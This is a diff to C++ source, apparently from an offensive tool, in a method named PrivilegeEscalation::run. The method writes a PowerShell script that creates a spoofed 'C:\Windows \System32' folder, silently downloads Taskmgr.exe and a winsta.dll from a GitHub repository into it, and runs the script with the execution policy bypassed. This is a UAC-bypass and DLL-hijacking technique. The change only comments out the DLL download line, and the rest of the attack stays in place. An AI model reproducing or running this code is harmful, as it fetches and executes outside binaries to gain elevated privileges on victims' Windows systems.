@@ -10,7 +10,7 @@ const bool PrivilegeEscalation::run(void)
     file << "New-Item \"\\\\?\\C:\\Windows \\System32\" -ItemType Directory 2>&1>$null" << std::endl;
     file << "$ProgressPreference = 'SilentlyContinue'" << std::endl;
     file << "wget \"https://github.com/Eyalasulin999/FileForPrivilegeEscalation/raw/main/Taskmgr.exe\" -outfile \"C:\\Windows \\System32\\Taskmgr.exe\" 2>&1>$null" << std::endl;
-    file << "wget \"https://github.com/Eyalasulin999/FileForPrivilegeEscalation/raw/main/winsta.dll\" -outfile \"C:\\Windows \\System32\\winsta.dll\" 2>&1>$null" << std::endl;
+    //file << "wget \"https://github.com/Eyalasulin999/FileForPrivilegeEscalation/raw/main/winsta.dll\" -outfile \"C:\\Windows \\System32\\winsta.dll\" 2>&1>$null" << std::endl;
     file.close();
     std::string command = "powershell -ExecutionPolicy Bypass -F " + tempPath; // Run the powershell file
     system(command.c_str());
